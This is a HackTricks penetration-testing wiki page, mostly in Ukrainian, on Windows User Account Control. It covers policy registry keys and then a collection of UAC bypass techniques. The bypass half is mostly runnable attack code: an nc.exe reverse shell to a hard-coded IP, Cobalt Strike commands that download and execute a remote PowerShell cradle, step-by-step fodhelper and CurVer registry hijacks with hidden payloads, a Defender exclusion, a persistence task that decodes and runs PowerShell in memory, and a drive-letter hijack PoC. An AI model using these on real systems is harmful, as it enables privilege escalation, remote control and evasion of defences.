# UAC - Контроль облікових записів користувачів

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) — це функція, що забезпечує запит підтвердження (consent prompt) для дій з підвищеними привілеями. У додатків є різні рівні `integrity`, і програма з високим рівнем може виконувати завдання, які потенційно можуть скомпрометувати систему. Коли UAC увімкнено, додатки й завдання завжди виконуються в контексті облікового запису стандартного користувача, якщо адміністратор явно не надає цим додаткам/завданням доступ адміністратора для виконання. Це зручна функція, яка захищає адміністраторів від ненавмисних змін, але не вважається межою безпеки.

Для додаткової інформації про рівні integrity:

{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Коли UAC увімкнено, користувач-адміністратор отримує 2 токени: один як стандартний користувач для виконання звичайних дій, і один з правами адміністратора.

Ця [сторінка](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) докладно описує, як працює UAC — процес входу, досвід користувача та архітектуру UAC. Адміністратори можуть використовувати політики безпеки для налаштування поведінки UAC локально (через secpol.msc) або ж налаштовувати й розсилати параметри через GPO в середовищі Active Directory. Різні налаштування описані детально [тут](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Існує 10 налаштувань групової політики для UAC. Нижче наведено додаткові деталі:

| Налаштування групової політики                                                                                                                                                                                                                                                                                                                                                  | Registry Key                | Налаштування за замовчуванням                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------- | -------------------------------------------------------------------------- |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Вимкнено)                                                              |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Запит згоди для бінарників, що не належать Windows, на захищеному робочому столі) |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Запит облікових даних на захищеному робочому столі)                     |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Увімкнено; за замовчуванням вимкнено в Enterprise)                     |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Вимкнено)                                                              |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Увімкнено)                                                             |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Увімкнено)                                                             |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Вимкнено)                                                              |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Увімкнено)                                                             |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Увімкнено)                                                             |

### Політики встановлення програмного забезпечення в Windows

Локальні політики безпеки (secpol.msc на більшості систем) за замовчуванням налаштовані так, щоб забороняти стандартним користувачам інсталювати програмне забезпечення. Це означає, що навіть якщо стандартний користувач може завантажити інсталятор вашої програми, він не зможе його запустити без облікового запису адміністратора.

### Ключі реєстру, щоб змусити UAC запитувати підвищення привілеїв

Як стандартний користувач без прав адміністратора, ви можете налаштувати систему так, щоб UAC запитував облікові дані стандартного облікового запису при спробі виконати певні дії. Для цього потрібно змінити певні ключі реєстру, для чого потрібні права адміністратора, якщо тільки не існує UAC bypass або атакуючий вже не залогінений як адмін.

Навіть якщо користувач входить до групи **Administrators**, ці зміни змушують його **повторно вводити облікові дані** для виконання адміністративних дій.

**Єдиний недолік у тому, що цей підхід вимагає відключеного UAC для роботи, що малоймовірно в production-середовищах.**

Ключі реєстру та записи, які потрібно змінити (із значеннями за замовчуванням у дужках):

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

Це також можна зробити вручну через інструмент Local Security Policy. Після змін адміністративні операції будуть вимагати повторного введення облікових даних.

### Примітка

**User Account Control не є межею безпеки.** Тому стандартні користувачі не можуть вийти зі своїх облікових записів і отримати права адміністратора без експлойта локального підвищення привілеїв.

### Ask for 'full computer access' to a user
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### UAC Привілеї

- Internet Explorer Protected Mode використовує перевірки рівня цілісності, щоб запобігти доступу процесів з високим рівнем цілісності (наприклад, веб-браузерів) до даних з низьким рівнем цілісності (наприклад, теки тимчасових Internet файлів). Це реалізується запуском браузера з токеном низького рівня цілісності. Коли браузер намагається отримати доступ до даних у зоні з низьким рівнем цілісності, операційна система перевіряє рівень цілісності процесу і відповідно дозволяє або забороняє доступ. Ця функція допомагає запобігти тому, щоб атаки з віддаленим виконанням коду отримували доступ до чутливих даних на системі.
- Коли користувач входить у Windows, система створює access token, який містить список привілеїв користувача. Привілеї визначаються як комбінація прав і можливостей користувача. Токен також містить список credentials користувача, які використовуються для автентифікації користувача на комп'ютері та до ресурсів у мережі.

### Autoadminlogon

Щоб налаштувати Windows на автоматичний вхід конкретного користувача під час запуску, встановіть **`AutoAdminLogon` реєстровий ключ**. Це корисно для кіосків або для тестових цілей. Використовуйте це тільки на безпечних системах, оскільки пароль зберігається у реєстрі.

Встановіть наступні ключі за допомогою Registry Editor або `reg add`:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

Щоб повернути звичайну поведінку входу, встановіть `AutoAdminLogon` у 0.

## UAC bypass

> [!TIP]
> Зауважте, що якщо у вас є графічний доступ до жертви, обхід UAC простий — ви просто можете натиснути "Yes", коли з'явиться запит UAC

Обхід UAC потрібен у такій ситуації: **UAC увімкнено, ваш процес працює в контексті середнього рівня цілісності, і ваш користувач належить до administrators group**.

Важливо зазначити, що **набагато складніше обійти UAC, якщо він встановлений на найвищий рівень безпеки (Always), ніж коли він знаходиться на будь-якому з інших рівнів (Default).**

### UAC disabled

Якщо UAC вже вимкнено (`ConsentPromptBehaviorAdmin` є **`0`**), ви можете **execute a reverse shell with admin privileges** (high integrity level), використовуючи, наприклад:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Дуже** базовий UAC "bypass" (повний доступ до файлової системи)

Якщо у вас є shell під користувачем, який входить до Administrators group, ви можете **mount the C$** через SMB локально як новий диск і отримаєте **доступ до всього в файловій системі** (навіть до домашньої папки Administrator).

> [!WARNING]
> **Схоже, цей трюк більше не працює**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass with cobalt strike

Техніки Cobalt Strike працюватимуть лише якщо UAC не встановлено на максимальний рівень безпеки
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** and **Metasploit** також мають кілька модулів для **bypass** **UAC**.

### KRBUACBypass

Документація та інструмент: [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME** ](https://github.com/hfiref0x/UACME) який є **збіркою** кількох UAC bypass exploits. Зверніть увагу, що вам потрібно **скомпілювати UACME за допомогою visual studio або msbuild**. При компіляції будуть створені кілька виконуваних файлів (наприклад `Source\Akagi\outout\x64\Debug\Akagi.exe`), вам потрібно знати **який саме потрібен.**\
Вам слід **бути обережним**, бо деякі bypasses можуть **спровокувати інші програми** показати повідомлення, які **попередять** **користувача**, що щось відбувається.

UACME має **build version from which each technique started working**. Ви можете шукати техніку, яка впливає на ваші версії:
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Також, використовуючи [this](https://en.wikipedia.org/wiki/Windows_10_version_history) сторінку, зі списку версій збірок можна визначити реліз Windows `1607`.

### UAC Bypass – fodhelper.exe (Registry hijack)

Довірений двійковий файл `fodhelper.exe` автоматично елевається в сучасних Windows. Після запуску він опитує шлях у реєстрі для поточного користувача, наведений нижче, не перевіряючи дію `DelegateExecute`. Розміщення там команди дозволяє процесу з Medium Integrity (користувач у Administrators) породити процес з High Integrity без UAC prompt.

Registry path queried by fodhelper:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>PowerShell кроки (set your payload, then trigger)</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
Примітки:
- Працює, коли поточний користувач є членом групи Administrators і рівень UAC встановлено за замовчуванням/пом'якшений (не Always Notify з додатковими обмеженнями).
- Використовуйте шлях `sysnative`, щоб запустити 64-розрядний PowerShell з 32-розрядного процесу на 64-розрядному Windows.
- Payload може бути будь-якою командою (PowerShell, cmd або шляхом до EXE). Уникайте інтерфейсів, що вимагають підтвердження, щоб зберегти прихованість.

#### CurVer/extension hijack варіант (тільки HKCU)

Останні зразки, що зловживають `fodhelper.exe`, уникають `DelegateExecute` і натомість **перенаправляють `ms-settings` ProgID** через значення `CurVer` для окремого користувача. Авто-підвищений бінарний файл все ще розв'язує обробник під `HKCU`, тому для створення ключів не потрібен admin token:
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
Після підвищення привілеїв шкідливе ПЗ зазвичай **вимикає майбутні запити**, встановлюючи `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` у `0`, потім виконує додатковий обхід захисту (наприклад, `Add-MpPreference -ExclusionPath C:\ProgramData`) і відновлює персистентність, щоб запускатися з високими привілеями. Типове завдання для персистентності зберігає на диску **XOR-encrypted PowerShell script** та декодує/виконує його в пам'яті кожну годину:
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
This variant still cleans up the dropper and leaves only the staged payloads, making detection rely on monitoring the **`CurVer` hijack**, `ConsentPromptBehaviorAdmin` tampering, Defender exclusion creation, or scheduled tasks that in-memory decrypt PowerShell.

#### Додаткові методи обходу UAC

**All** the techniques used here to bypass AUC **require** a **full interactive shell** with the victim (a common nc.exe shell is not enough).

You can get using a **meterpreter** session. Migrate to a **process** that has the **Session** value equals to **1**:

![](<../../images/image (863).png>)

(_explorer.exe_ повинен працювати)

### UAC Bypass with GUI

Якщо у вас є доступ до **GUI — ви можете просто погодитися з запитом UAC**, коли він з'явиться; насправді вам тоді не потрібен обхід. Отже, доступ до GUI дозволяє обійти UAC.

Крім того, якщо ви отримуєте GUI-сеанс, який хтось використовував (можливо через RDP), є **інструменти, які будуть працювати як administrator**, звідки ви можете, наприклад, **запустити** **cmd** від імені **admin** без повторного запиту UAC, наприклад [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Це може бути трохи більш **стелсно**.

### Noisy brute-force UAC bypass

Якщо вам байдуже щодо шуму, ви завжди можете **запустити щось на кшталт** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin), що **проситиме підвищити права, поки користувач не погодиться**.

### Your own bypass - Basic UAC bypass methodology

Якщо ви поглянете на **UACME**, помітите, що **більшість обходів UAC зловживають Dll Hijacking вразливістю** (здебільшого шляхом запису шкідливої dll у _C:\Windows\System32_). [Прочитайте це, щоб дізнатися, як знайти вразливість Dll Hijacking](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Знайдіть бінар, який буде **autoelevate** (перевірте, що при його виконанні він працює на високому рівні цілісності).
2. За допомогою procmon знайдіть події "**NAME NOT FOUND**", які можуть бути вразливими до **DLL Hijacking**.
3. Ймовірно, вам потрібно буде **записати** DLL всередину деяких **захищених шляхів** (наприклад C:\Windows\System32), де у вас немає прав на запис. Ви можете обійти це, використовуючи:
1. **wusa.exe**: Windows 7,8 and 8.1. Дозволяє витягнути вміст CAB-файлу у захищені шляхи (оскільки цей інструмент виконується з високим рівнем цілісності).
2. **IFileOperation**: Windows 10.
4. Підготуйте **скрипт**, щоб скопіювати вашу DLL у захищений шлях і виконати вразливий та autoelevated бінар.

### Another UAC bypass technique

Полягає в тому, щоб спостерігати, чи намагається **autoElevated binary** **read** з **registry** **name/path** бінару чи команди, що має бути **executed** (це більш цікаво, якщо бінар шукає цю інформацію всередині **HKCU**).

### Administrator Protection (25H2) drive-letter hijack via per-logon-session DOS device map

Windows 11 25H2 “Administrator Protection” використовує shadow-admin токени з per-session `\Sessions\0\DosDevices/<LUID>` мапами. Директорія створюється ліниво `SeGetTokenDeviceMap` при першому розв’язанні `\??`. Якщо атакувальник імперсоніфікує shadow-admin токен лише на рівні **SecurityIdentification**, директорія створюється з атакувальником як **owner** (успадковує `CREATOR OWNER`), що дозволяє створювати drive-letter посилання, які мають пріоритет над `\GLOBAL??`.

**Кроки:**

1. З низькоправного сеансу викликати `RAiProcessRunOnce`, щоб запустити беззапитний shadow-admin `runonce.exe`.
2. Дуплікувати його первинний токен у **identification** токен і імперсоніфікувати його під час відкриття `\??`, щоб примусити створення `\Sessions\0\DosDevices/<LUID>` під власністю атакувальника.
3. Створити там символічне посилання `C:`, яке вказує на контрольоване атакувальником сховище; подальші файлові звернення в тому сеансі будуть резолвитися так, що `C:` вказуватиме на шлях атакувальника, дозволяючи DLL/file hijack без підказки.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
## Посилання
- [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf) – fodhelper UAC bypass steps](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
- [LOLBAS: Fodhelper.exe](https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/)
- [Microsoft Docs – How User Account Control works](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [UACME – UAC bypass techniques collection](https://github.com/hfiref0x/UACME)
- [Checkpoint Research – KONNI Adopts AI to Generate PowerShell Backdoors](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [Project Zero – Windows Administrator Protection drive-letter hijack](https://projectzero.google/2026/26/windows-administrator-protection.html)

{{#include ../../banners/hacktricks-training.md}}
